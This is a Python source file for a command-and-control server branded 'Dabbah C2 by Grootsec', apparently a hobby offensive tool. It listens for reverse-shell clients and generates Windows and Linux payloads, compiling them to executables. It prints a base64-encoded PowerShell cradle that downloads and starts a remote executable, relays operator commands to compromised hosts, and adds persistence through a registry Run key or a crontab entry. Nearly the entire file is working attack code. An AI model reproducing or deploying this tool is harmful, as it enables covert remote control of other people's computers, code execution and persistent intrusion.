import socket
import sys
import threading
import os
import os.path
from prettytable import PrettyTable
import time
from datetime import datetime
import random
import string
import shutil
import subprocess
import base64

def banner():    
    print('·▄▄▄▄   ▄▄▄· ▄▄▄▄· ▄▄▄▄·  ▄▄▄·  ▄ .▄     ▄▄·2 ')
    print('██▪ ██ ▐█ ▀█ ▐█ ▀█▪▐█ ▀█▪▐█ ▀█ ██▪▐█    ▐█ ▌▪')
    print('▐█· ▐█▌▄█▀▀█ ▐█▀▀█▄▐█▀▀█▄▄█▀▀█ ██▀▐█    ██ ▄▄ by Grootsec')
    print('██. ██ ▐█ ▪▐▌██▄▪▐███▄▪▐█▐█ ▪▐▌██▌▐▀    ▐███▌')
    print('▀▀▀▀▀•  ▀  ▀ ·▀▀▀▀ ·▀▀▀▀  ▀  ▀ ▀▀▀ ·    ·▀▀▀ ')

def help():
    print('''
    
     ▄▄·       • ▌ ▄ ·. • ▌ ▄ ·.  ▄▄▄·  ▐ ▄ ·▄▄▄▄  .▄▄ · 
    ▐█ ▌▪▪     ·██ ▐███▪·██ ▐███▪▐█ ▀█ •█▌▐███▪ ██ ▐█ ▀. 
    ██ ▄▄ ▄█▀▄ ▐█ ▌▐▌▐█·▐█ ▌▐▌▐█·▄█▀▀█ ▐█▐▐▌▐█· ▐█▌▄▀▀▀█▄
    ▐███▌▐█▌.▐▌██ ██▌▐█▌██ ██▌▐█▌▐█ ▪▐▌██▐█▌██. ██ ▐█▄▪▐█
    ·▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀▀▀  █▪▀▀▀ ▀  ▀ ▀▀ █▪▀▀▀▀▀•  ▀▀▀▀ 
    -----------------------------------------------------
    Menu Commands
    ------------------------------------------------------------------------
    listeners -g            --> Generate a new listener
    winclient py            --> Generate a Windows Compatible Python Payload
    linclient py            --> Generate a Linux Compatible Python Payload
    execlient               --> Generate an executable payload for Windows
    sessions -l             --> List sessions
    sessions -i <val>       --> Enter a new session
    kill <val>              --> Kills an active session
          
    Session Commands
    ------------------------------------------------------------------------
    background or bg        --> Backgrounds the current session
    exit                    --> Terminates the current session
    ''')

def pshell_cradle():
    web_server_ip = input('[*] Web server listening host: ')
    web_server_port = input('[*] Web server port: ')
    payload_name = input('[*] Payload name: ')
    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    runner_file = f'{runner_file}.txt'
    randomized_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    randomized_exe_file = f"{randomized_exe_file}.exe"
    print(f'[*] Run the following command to start a web server\npython3 -m http.server -b {web_server_ip} {web_server_port}')
    runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file})".encode('utf-16le')
    with open(runner_file, 'w') as f:
        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomized_exe_file}; Start-Process -FilePath {randomized_exe_file}')
    f.close()
    b64_runner_cal = base64.b64encode(runner_cal_unencoded)
    b64_runner_cal = b64_runner_cal.decode()
    print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')
    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
    print(f'Unencoded payload\n\n{b64_runner_cal_decoded}')

def winclient():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    check_cwd = os.getcwd()
    if not os.path.exists(f'{check_cwd}\\winclient.py'):
        print('[-] winclient.py file not found') 
    else:
        shutil.copy('winclient.py', file_name)
        with open(file_name) as f:
            new_host = f.read().replace('INPUT_IP_HERE', host_ip)
            with open(file_name, 'w') as f:
                f.write(new_host)
                f.close()
            with open(file_name) as f:
                new_port = f.read().replace('INPUT_PORT_HERE', host_port)
                with open(file_name, 'w') as f:
                    f.write(new_port)
                    f.close()
        return file_name
def linclient():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\linclient.py'):
        shutil.copy('linclient.py', file_name)
    else:
        print('[-] linclient.py file not found')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
        with open(file_name, 'w') as f:
            f.write(new_host)
            f.close()
        with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
            with open(file_name, 'w') as f:
                f.write(new_port)
                f.close()

def execlient():
    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{ran_name}.py'
    exe_file = f'{ran_name}.exe'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winclient.py'):
        shutil.copy('winclient.py', file_name)
    else:
        print('[-] winclient.py file not found')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
        with open(file_name, 'w') as f:
            f.write(new_host)
            f.close()
        with open(file_name) as f:
            new_port = f.read().replace('INPUT_PORT_HERE', host_port)
            with open(file_name, 'w') as f:
                f.write(new_port)
                f.close()
        pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
        print(f'[*] Compiling executable {exe_file}...')
        subprocess.call(pyinstaller_exec, etderr=subprocess.DEVNULL)
        os.remove(f'{ran_name}.spec')
        shutil.rmtree('build')
        if os.path.exists(f'{check_cwd}\\{exe_file}'):
            print(f'[+] {exe_file} saved to current directory')
        else:
            print(f'[-] Error ocurred during exe generation')

def comm_in(targ_id):
    print('[*] Awaiting response...')
    response = targ_id.recv(4096).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response

def comm_out(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def kill_sig(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)

def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            username = base64.b64decode(username).decode()
            #admin = remote_target.recv(1024).decode()
            #admin = base64.b64decode(username).decode()
            op_sys = remote_target.recv(4096).decode()
            op_sys = base64.b64decode(op_sys).decode()
            #if admin == 1:
            #    admin_val = 'Yes'
            #elif username == 'root':
            #    admin_val= 'Yes'
            #else:
            #    admin_val = 'No'
            if 'Windows' in op_sys:
                pay_val = 1
            else: 
                pay_val = 2
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, "Placeholder", op_sys, pay_val, 'Active'])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record, username, 'Placeholder', op_sys, pay_val, 'Active'])
                print(f'\n[+] Connection recevied from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass

def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[*] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def target_comm(targ_id, targets, num):
    while True:
        message = input(f'{targets[num][3]}/{targets[num][1]}#> ')
        if len(message) == 0:
            continue
        if message == 'help':
            pass
        else:
            comm_out(targ_id, message)
            if message == 'exit':
                message = base64.b64encode(message.encode())
                targ_id.send(message)
                targ_id.close()
                targets[num][7] = 'Dead'
                break
            if message == 'background' or message == 'bg':
                break
            if message == 'help':
                pass
            if message == 'persist':
                payload_name = input('[*] Enter payload name: ')
                if targets[num][6] == 1:
                    persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                    persist_command_1 = base64.b64encode(persist_command_1.encode())
                    targ_id.send(persist_command_1)
                    persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screen door /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                    persist_command_2 = base64.b64encode(persist_command_2.encode())
                    targ_id.send(persist_command_2)
                    print('[*] Run this command to clean up the registry:\nreg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVerison\Run /v screendoor /f')
                if targets[num][6] == 2:
                    persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                    persist_command = base64.b64encode(persist_command.encode())
                    targ_id.send(persist_command)
                    print('[*] Run this command to clean up the crontab: \ncrontab -r')
                print('[*] Persistence technique completed')
            else:
                response = comm_in(targ_id)
                if response == 'exit':
                    print('[-] The client has terminated the session')
                    targ_id.close()
                    break
                print(response)

if __name__ == '__main__':
    targets = []
    kill_flag = 0
    listener_counter = 0
    banner()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            command = input('Command#> ')
            if command == 'help':
                help()
            if command.split(" ")[0] == 'kill':
                try:
                    num = int(command.split(" ")[1])
                    targ_id = (targets[num])[0]
                    if (targets[num])[7] == 'Active':
                        kill_sig(targ_id, 'exit')
                        targets[num][7] = 'Dead'
                        print(f'[*] Session {num} terminated')
                    else:
                        print('[-] You cannot interact with a dead session')
                except (IndexError, ValueError):
                    print(f'[-] Session {num} does not exist')
            if command == 'listeners -g':
                host_ip = input('[*] Enter the IP to listen on: ')
                host_port = input('[*] Enter the port to listen on: ')
                listener_handler()
                listener_counter += 1
            if command == 'winclient py':
                if listener_counter > 0:
                    file_name = winclient()
                    print(f'Payload successfully created - {file_name}')
                else:
                    print('[-] You cannot generate a payload without an active listener')
            if command == 'linclient py':
                if listener_counter > 0:
                    linclient()
                else: 
                    print('[-] You cannot generate a payload without an active listener')
            if command == 'execlient py':
                if listener_counter > 0:
                    execlient()
                else:
                    print('[-] You cannot generate a payload without an active listener')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1]  == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Check-in Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
                        session_counter += 1
                    print(myTable)
                if command.split(" ")[1] == '-i':
                    try:
                        num = int(command.split(" ")[2])
                        targ_id = (targets[num])[0]
                        if targets[num][7] == 'Active':
                            target_comm(targ_id, targets, num)
                        else:
                            print('[-] You cannot interact with a dead session')
                    except IndexError:
                        print(f'[-] Session {num} does not exist')
            if command == 'pshell_shell':
                pshell_cradle()
            if command == 'exit' or command == 'quit':
                quit_message = input('[*] Do you really want to quit? (y/n): ').lower()
                if quit_message == 'y':
                    tar_length = len(targets)
                    for target in targets:
                        if target[7] == 'Dead':
                            pass
                        else: 
                            comm_out(target[0], 'exit')
                    kill_flag = 1
                    if listener_counter > 0:
                        sock.close()
                    break
                else:
                    continue   
        except KeyboardInterrupt:
            quit_message = input('Ctrl-C\n[*] Do you really want to quit? (y/n): ').lower()
            if quit_message == 'y':
                tar_length = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else: 
                        comm_out(target[0], 'exit')
                kill_flag = 1
                if listener_counter > 0:
                    sock.close()
                break
            else:
                continue   